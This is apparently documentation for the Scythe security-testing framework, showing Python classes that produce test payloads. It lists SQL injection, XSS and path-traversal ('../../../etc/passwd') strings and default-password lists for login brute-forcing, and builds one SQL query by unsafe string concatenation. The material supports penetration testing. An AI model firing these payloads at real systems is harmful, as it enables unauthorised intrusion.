# Scythe Payload Generators Framework

Payload generators are a core component of the Scythe framework that provide flexible and extensible ways to generate test data for TTPs. This document covers everything you need to know about using existing payload generators and creating custom ones.

## Overview

Payload generators in Scythe are responsible for:
- Providing test data to TTPs in a structured way
- Supporting different data sources (files, static lists, APIs, etc.)
- Enabling dynamic payload generation
- Facilitating payload transformation and encoding
- Supporting infinite or finite payload streams

All payload generators implement a common interface that makes them interchangeable and easy to use with any TTP.

## Core Payload Generator Interface

### Base PayloadGenerator Class

```python
from typing import Generator, Any

class PayloadGenerator:
    """Base class for payload generators."""
    
    def __iter__(self) -> Generator[Any, None, None]:
        raise NotImplementedError
    
    def __call__(self) -> Generator[Any, None, None]:
        return self.__iter__()
```

### Usage Pattern

Payload generators are designed to be used as iterables:

```python
# Direct iteration
for payload in payload_generator:
    print(payload)

# Generator expression
payloads = list(payload_generator())

# With TTPs
ttp = SomeTTP(payload_generator=my_generator)
```

## Built-in Payload Generators

### StaticPayloadGenerator

The simplest payload generator that yields payloads from a predefined list.

```python
from scythe.payloads.generators import StaticPayloadGenerator

# Basic usage
passwords = StaticPayloadGenerator([
    "password",
    "123456", 
    "admin",
    "qwerty",
    "letmein"
])

# Use with TTP
for password in passwords:
    print(f"Testing: {password}")
```

**Characteristics:**
- Finite payload stream
- In-memory storage
- Fast iteration
- Suitable for small to medium payload sets

**Use Cases:**
- Quick testing with known payloads
- Small wordlists
- Custom payload sets
- Proof of concept testing

**Advanced Usage:**
```python
# Mixed data types
mixed_payloads = StaticPayloadGenerator([
    "string_payload",
    123,
    {"key": "value"},
    ["list", "payload"]
])

# Large payload sets (be mindful of memory)
large_payloads = StaticPayloadGenerator([
    f"payload_{i}" for i in range(10000)
])
```

### WordlistPayloadGenerator

Reads payloads from a file, one payload per line. Ideal for large wordlists.

```python
from scythe.payloads.generators import WordlistPayloadGenerator

# Basic usage
wordlist = WordlistPayloadGenerator("wordlists/passwords.txt")

# Use with TTP
login_ttp = LoginBruteforceTTP(
    payload_generator=wordlist,
    username="admin",
    # ... other parameters
)
```

**Characteristics:**
- Memory efficient (reads file line by line)
- Supports large files
- Automatic line stripping
- File-based persistence

**File Format:**
```
password
123456
admin
qwerty
letmein
P@ssw0rd
admin123
```

**Use Cases:**
- Large password lists (rockyou.txt, etc.)
- Wordlists from security tools
- Custom dictionary files
- Memory-constrained environments

**Best Practices:**
```python
# Ensure file exists and is readable
import os
if os.path.exists("wordlist.txt") and os.access("wordlist.txt", os.R_OK):
    generator = WordlistPayloadGenerator("wordlist.txt")
else:
    # Fallback to static generator
    generator = StaticPayloadGenerator(["default", "backup"])
```

## Creating Custom Payload Generators

### Basic Custom Generator

```python
from scythe.payloads.generators import PayloadGenerator
import random
import string

class RandomStringGenerator(PayloadGenerator):
    """Generates random strings of specified length."""
    
    def __init__(self, min_length=5, max_length=15, count=100):
        self.min_length = min_length
        self.max_length = max_length
        self.count = count
    
    def __iter__(self):
        for _ in range(self.count):
            length = random.randint(self.min_length, self.max_length)
            yield ''.join(random.choices(
                string.ascii_letters + string.digits, 
                k=length
            ))

# Usage
random_gen = RandomStringGenerator(min_length=8, max_length=12, count=50)
for payload in random_gen:
    print(payload)  # Outputs: "aB3kL9mX", "pQ7nR2sT4", etc.
```

### Advanced Custom Generators

#### SQLInjectionPayloadGenerator

```python
import urllib.parse
from typing import List, Optional

class SQLInjectionPayloadGenerator(PayloadGenerator):
    """Generates comprehensive SQL injection payloads."""
    
    def __init__(self, 
                 include_union=True, 
                 include_blind=True, 
                 include_time_based=True,
                 url_encode=False,
                 custom_payloads: Optional[List[str]] = None):
        self.include_union = include_union
        self.include_blind = include_blind
        self.include_time_based = include_time_based
        self.url_encode = url_encode
        self.custom_payloads = custom_payloads or []
    
    def __iter__(self):
        payloads = []
        
        # Basic payloads
        payloads.extend([
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "') or '1'='1--",
            "') or ('1'='1--"
        ])
        
        # Union-based payloads
        if self.include_union:
            payloads.extend([
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT version(),2,3--",
                "' UNION SELECT database(),user(),version()--"
            ])
        
        # Blind SQL injection
        if self.include_blind:
            payloads.extend([
                "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
                "' AND (SELECT COUNT(*) FROM users) > 0--",
                "' AND LENGTH(database()) > 5--",
                "' AND ASCII(SUBSTRING((SELECT version()),1,1)) > 52--"
            ])
        
        # Time-based payloads
        if self.include_time_based:
            payloads.extend([
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ])
        
        # Add custom payloads
        payloads.extend(self.custom_payloads)
        
        # Apply encoding if requested
        for payload in payloads:
            if self.url_encode:
                yield urllib.parse.quote(payload)
            else:
                yield payload

# Usage
sql_gen = SQLInjectionPayloadGenerator(
    include_union=True,
    include_time_based=False,
    url_encode=True,
    custom_payloads=["' OR 'a'='a", "1' OR '1'='1"]
)
```

#### DynamicWebPayloadGenerator

```python
import requests
from bs4 import BeautifulSoup
import time

class DynamicWebPayloadGenerator(PayloadGenerator):
    """Generates payloads based on web scraping and analysis."""
    
    def __init__(self, 
                 target_url: str,
                 analysis_type: str = "forms",
                 max_payloads: int = 100):
        self.target_url = target_url
        self.analysis_type = analysis_type
        self.max_payloads = max_payloads
        self.session = requests.Session()
    
    def __iter__(self):
        if self.analysis_type == "forms":
            yield from self._analyze_forms()
        elif self.analysis_type == "parameters":
            yield from self._analyze_parameters()
        elif self.analysis_type == "javascript":
            yield from self._analyze_javascript()
    
    def _analyze_forms(self):
        """Generate payloads based on form analysis."""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            forms = soup.find_all('form')
            count = 0
            
            for form in forms:
                if count >= self.max_payloads:
                    break
                
                inputs = form.find_all('input')
                for input_field in inputs:
                    if count >= self.max_payloads:
                        break
                    
                    field_type = input_field.get('type', 'text')
                    field_name = input_field.get('name', '')
                    
                    # Generate appropriate payloads based on field type
                    if field_type == 'password':
                        yield from self._password_payloads(field_name)
                        count += 1
                    elif field_type == 'email':
                        yield from self._email_payloads(field_name)
                        count += 1
                    elif field_type == 'text':
                        yield from self._text_payloads(field_name)
                        count += 1
                        
        except Exception as e:
            print(f"Error analyzing forms: {e}")
    
    def _password_payloads(self, field_name):
        """Generate password-specific payloads."""
        return [
            "password",
            "admin", 
            "123456",
            f"{field_name}123",
            "password123"
        ]
    
    def _email_payloads(self, field_name):
        """Generate email-specific payloads."""
        return [
            "admin@test.com",
            "test@example.com",
            f"{field_name}@domain.com",
            "user@localhost"
        ]
    
    def _text_payloads(self, field_name):
        """Generate text-specific payloads."""
        return [
            "test",
            f"test_{field_name}",
            "<script>alert('xss')</script>",
            "' OR '1'='1",
            "../../../etc/passwd"
        ]
```

#### DatabasePayloadGenerator

```python
import sqlite3
from typing import Optional

class DatabasePayloadGenerator(PayloadGenerator):
    """Generates payloads from a database."""
    
    def __init__(self, 
                 db_path: str,
                 table: str,
                 column: str,
                 where_clause: Optional[str] = None,
                 limit: Optional[int] = None):
        self.db_path = db_path
        self.table = table
        self.column = column
        self.where_clause = where_clause
        self.limit = limit
    
    def __iter__(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            # Build query
            query = f"SELECT {self.column} FROM {self.table}"
            
            if self.where_clause:
                query += f" WHERE {self.where_clause}"
            
            if self.limit:
                query += f" LIMIT {self.limit}"
            
            # Execute and yield results
            cursor.execute(query)
            for row in cursor.fetchall():
                yield row[0]
                
        finally:
            conn.close()

# Usage
db_gen = DatabasePayloadGenerator(
    db_path="payloads.db",
    table="passwords",
    column="password",
    where_clause="strength = 'weak'",
    limit=1000
)
```

## Specialized Payload Generators

### EncodingPayloadGenerator

```python
import base64
import urllib.parse
import html

class EncodingPayloadGenerator(PayloadGenerator):
    """Applies various encodings to base payloads."""
    
    def __init__(self, base_generator: PayloadGenerator, encodings: List[str]):
        self.base_generator = base_generator
        self.encodings = encodings
    
    def __iter__(self):
        for payload in self.base_generator:
            # Yield original payload
            yield payload
            
            # Yield encoded versions
            for encoding in self.encodings:
                encoded = self._encode_payload(payload, encoding)
                if encoded:
                    yield encoded
    
    def _encode_payload(self, payload: str, encoding: str) -> Optional[str]:
        try:
            if encoding == "url":
                return urllib.parse.quote(payload)
            elif encoding == "double_url":
                return urllib.parse.quote(urllib.parse.quote(payload))
            elif encoding == "base64":
                return base64.b64encode(payload.encode()).decode()
            elif encoding == "html":
                return html.escape(payload)
            elif encoding == "hex":
                return payload.encode().hex()
            else:
                return None
        except Exception:
            return None

# Usage
base_payloads = StaticPayloadGenerator(["<script>alert('xss')</script>"])
encoded_gen = EncodingPayloadGenerator(
    base_generator=base_payloads,
    encodings=["url", "double_url", "html", "base64"]
)
```

### CombinationPayloadGenerator

```python
import itertools

class CombinationPayloadGenerator(PayloadGenerator):
    """Generates combinations of multiple payload sets."""
    
    def __init__(self, *generators, combination_type="product"):
        self.generators = generators
        self.combination_type = combination_type
    
    def __iter__(self):
        # Convert generators to lists (needed for itertools)
        payload_lists = [list(gen) for gen in self.generators]
        
        if self.combination_type == "product":
            # Cartesian product
            for combination in itertools.product(*payload_lists):
                yield combination
        elif self.combination_type == "chain":
            # Sequential chaining
            for payload_list in payload_lists:
                yield from payload_list
        elif self.combination_type == "zip":
            # Parallel iteration
            for combination in zip(*payload_lists):
                yield combination

# Usage
usernames = StaticPayloadGenerator(["admin", "user", "test"])
passwords = StaticPayloadGenerator(["password", "123456", "admin"])

# Generate all username/password combinations
combo_gen = CombinationPayloadGenerator(
    usernames, passwords, 
    combination_type="product"
)

for username, password in combo_gen:
    print(f"{username}:{password}")
```

### ConditionalPayloadGenerator

```python
class ConditionalPayloadGenerator(PayloadGenerator):
    """Generates payloads based on conditions and context."""
    
    def __init__(self, base_generator: PayloadGenerator, condition_func=None):
        self.base_generator = base_generator
        self.condition_func = condition_func or (lambda x: True)
        self.context = {}
    
    def set_context(self, key: str, value):
        """Set context that can influence payload generation."""
        self.context[key] = value
    
    def __iter__(self):
        for payload in self.base_generator:
            if self.condition_func(payload):
                # Apply context-based modifications
                modified_payload = self._apply_context(payload)
                yield modified_payload
    
    def _apply_context(self, payload: str) -> str:
        """Apply context-based modifications to payload."""
        modified = payload
        
        # Example: Add prefix based on context
        if self.context.get("target_type") == "mysql":
            if "UNION" in payload.upper():
                modified = payload.replace("--", "# ")
        
        # Example: Adjust for detected filters
        if self.context.get("filters_detected"):
            modified = modified.replace("'", "''")
        
        return modified

# Usage
sql_payloads = StaticPayloadGenerator([
    "' OR '1'='1' --",
    "' UNION SELECT NULL--"
])

conditional_gen = ConditionalPayloadGenerator(
    sql_payloads,
    condition_func=lambda x: "UNION" in x.upper()  # Only UNION payloads
)
conditional_gen.set_context("target_type", "mysql")
```

## Advanced Patterns

### Infinite Payload Generators

```python
import random
import time

class InfiniteRandomPayloadGenerator(PayloadGenerator):
    """Generates infinite stream of random payloads."""
    
    def __init__(self, patterns: List[str], seed=None):
        self.patterns = patterns
        if seed:
            random.seed(seed)
    
    def __iter__(self):
        while True:  # Infinite loop
            pattern = random.choice(self.patterns)
            yield self._generate_from_pattern(pattern)
    
    def _generate_from_pattern(self, pattern: str) -> str:
        # Replace placeholders with random values
        import re
        
        # Replace {random} with random string
        pattern = re.sub(
            r'\{random\}', 
            lambda m: ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)),
            pattern
        )
        
        # Replace {number} with random number
        pattern = re.sub(
            r'\{number\}',
            lambda m: str(random.randint(1, 1000)),
            pattern
        )
        
        return pattern

# Usage (be careful with infinite generators!)
infinite_gen = InfiniteRandomPayloadGenerator([
    "user_{random}",
    "test_{number}",
    "{random}@domain.com"
])

# Use with limit
count = 0
for payload in infinite_gen:
    print(payload)
    count += 1
    if count >= 10:  # Stop after 10 payloads
        break
```

### Cached Payload Generators

```python
import functools
import hashlib

class CachedPayloadGenerator(PayloadGenerator):
    """Caches generated payloads to avoid regeneration."""
    
    def __init__(self, base_generator: PayloadGenerator, cache_size=1000):
        self.base_generator = base_generator
        self.cache_size = cache_size
        self._cache = {}
        self._cache_order = []
    
    def __iter__(self):
        cache_key = self._get_cache_key()
        
        if cache_key in self._cache:
            # Return cached payloads
            yield from self._cache[cache_key]
        else:
            # Generate and cache payloads
            payloads = list(self.base_generator)
            self._add_to_cache(cache_key, payloads)
            yield from payloads
    
    def _get_cache_key(self):
        """Generate cache key based on generator configuration."""
        generator_str = str(self.base_generator.__dict__)
        return hashlib.md5(generator_str.encode()).hexdigest()
    
    def _add_to_cache(self, key: str, payloads: List):
        """Add payloads to cache with size management."""
        if len(self._cache) >= self.cache_size:
            # Remove oldest entry
            oldest_key = self._cache_order.pop(0)
            del self._cache[oldest_key]
        
        self._cache[key] = payloads
        self._cache_order.append(key)
```

## Performance Optimization

### Memory-Efficient Generators

```python
class MemoryEfficientGenerator(PayloadGenerator):
    """Generator optimized for memory usage."""
    
    def __init__(self, file_path: str, chunk_size=1024):
        self.file_path = file_path
        self.chunk_size = chunk_size
    
    def __iter__(self):
        with open(self.file_path, 'r') as f:
            buffer = ""
            while True:
                chunk = f.read(self.chunk_size)
                if not chunk:
                    # Process remaining buffer
                    if buffer.strip():
                        yield buffer.strip()
                    break
                
                buffer += chunk
                lines = buffer.split('\n')
                
                # Yield complete lines
                for line in lines[:-1]:
                    if line.strip():
                        yield line.strip()
                
                # Keep incomplete line in buffer
                buffer = lines[-1]
```

### Parallel Payload Processing

```python
import multiprocessing
from concurrent.futures import ThreadPoolExecutor

class ParallelPayloadGenerator(PayloadGenerator):
    """Processes payloads in parallel for performance."""
    
    def __init__(self, base_generator: PayloadGenerator, 
                 processor_func=None, max_workers=4):
        self.base_generator = base_generator
        self.processor_func = processor_func or (lambda x: x)
        self.max_workers = max_workers
    
    def __iter__(self):
        payloads = list(self.base_generator)
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            processed_payloads = executor.map(self.processor_func, payloads)
            yield from processed_payloads

# Usage
def complex_processing(payload):
    # Simulate complex payload processing
    import time
    time.sleep(0.1)  # Simulate work
    return payload.upper()

base_gen = StaticPayloadGenerator(["test1", "test2", "test3"])
parallel_gen = ParallelPayloadGenerator(
    base_gen, 
    processor_func=complex_processing,
    max_workers=2
)
```

## Testing Payload Generators

### Unit Testing

```python
import unittest

class TestPayloadGenerators(unittest.TestCase):
    
    def test_static_generator(self):
        payloads = ["test1", "test2", "test3"]
        generator = StaticPayloadGenerator(payloads)
        
        result = list(generator)
        self.assertEqual(result, payloads)
    
    def test_wordlist_generator(self):
        # Create temporary test file
        import tempfile
        import os
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write("line1\nline2\nline3\n")
            temp_path = f.name
        
        try:
            generator = WordlistPayloadGenerator(temp_path)
            result = list(generator)
            self.assertEqual(result, ["line1", "line2", "line3"])
        finally:
            os.unlink(temp_path)
    
    def test_custom_generator(self):
        generator = RandomStringGenerator(min_length=5, max_length=5, count=10)
        result = list(generator)
        
        self.assertEqual(len(result), 10)
        for payload in result:
            self.assertEqual(len(payload), 5)
            self.assertTrue(payload.isalnum())

if __name__ == "__main__":
    unittest.main()
```

### Performance Testing

```python
import time

def benchmark_generator(generator, name="Generator"):
    """Benchmark a payload generator."""
    start_time = time.time()
    count = 0
    
    for payload in generator:
        count += 1
        if count >= 1000:  # Limit for testing
            break
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"{name}: {count} payloads in {duration:.2f}s ({count/duration:.2f} payloads/s)")

# Benchmark different generators
benchmark_generator(
    StaticPayloadGenerator([f"payload_{i}" for i in range(1000)]),
    "Static Generator"
)

benchmark_generator(
    WordlistPayloadGenerator("large_wordlist.txt"),
    "Wordlist Generator"
)
```

## Best Practices

### 1. Generator Design

**Follow the Iterator Protocol:**
```python
class GoodGenerator(PayloadGenerator):
    def __iter__(self):
        # Always return a generator
        yield from self._generate_payloads()
    
    def _generate_payloads(self):
        # Separate generation logic
        for i in range(10):
            yield f"payload_{i}"
```

**Handle Errors Gracefully:**
```python
class RobustGenerator(PayloadGenerator):
    def __iter__(self):
        try:
            yield from self._safe_generation()
        except Exception as e:
            print(f"Error in generator: {e}")
            # Yield fallback payloads
            yield from ["fallback1", "fallback2"]
    
    def _safe_generation(self):
        # Generation logic that might fail
        pass
```

### 2. Memory Management

**For Large Datasets:**
```python
# Good: Stream processing
def process_large_file(file_path):
    with open(file_path, 'r') as f:
        for line in f:
            yield line.strip()

# Avoid: Loading everything into memory
def bad_process_large_file(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f]  # Memory intensive
```

### 3. Configuration and Flexibility

**Make Generators Configurable:**
```python
class ConfigurableGenerator(PayloadGenerator):
    def __init__(self, **kwargs):
        self.config = {
            'count': 100,
            'prefix': '',
            'suffix': '',
            'encoding': 'utf-8'
        }
        self.config.update(kwargs)
    
    def __iter__(self):
        for i in range(self.config['count']):
            payload = f"{self.config['prefix']}payload_{i}{self.config['suffix']}"
            yield payload
```

### 4. Error Handling and Logging

```python
import logging

class LoggingGenerator(PayloadGenerator):
    def __init__(self, base_generator):
        self.base_generator = base_generator
        self.logger = logging.getLogger(__name__)
    
    def __iter__(self):
        count = 0
        for payload in self.base_generator:
            count += 1
            self.logger.debug(f"Generated payload {count}: {payload}")
            yield payload
        
        self.logger.info(f"Generated {count} total payloads")
```

## Common Use Cases

### Password Testing
```python
# Combine multiple password strategies
username_variations = StaticPayloadGenerator(["admin", "user", "test"])
common_passwords = WordlistPayloadGenerator("common_passwords.txt")
user_specific = StaticPayloadGenerator([
    "{username}123", "{username}!", "{username}2023"
])
```

### Web Application Testing
```python
# XSS payloads
xss_gen = StaticPayloadGenerator([
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')"
])

# SQL injection with encoding
sql_gen = EncodingPayloadGenerator(
    SQLInjectionPayloadGenerator(),
    encodings=["url", "double_url"]
)
```

### API Testing
```python
# Generate API payloads
api_gen = CombinationPayloadGenerator(
    StaticPayloadGenerator(["GET", "POST", "PUT", "DELETE"]),
    StaticPayloadGenerator(["/api/users", "/api/admin", "/api/data"]),
    combination_type="product"
)
```

## Troubleshooting

### Common Issues

1. **Memory Usage**: Use streaming generators for large datasets
2. **Performance**: Implement caching for expensive operations
3. **Error Handling**: Always provide fallback payloads
4. **Encoding**: Handle different character encodings properly

### Debug Mode

```python
class DebugGenerator(PayloadGenerator):
    def __init__(self, base_generator, debug=False):
        self.base_generator = base_generator
        self.debug = debug
    
    def __iter__(self):
        for i, payload in enumerate(self.base_generator):
            if self.debug:
                print(f"Debug: Payload {i}: {repr(payload)}")
            yield payload
```

For more examples and advanced usage patterns, see the `examples/` directory and the TTP implementations that use various payload generators.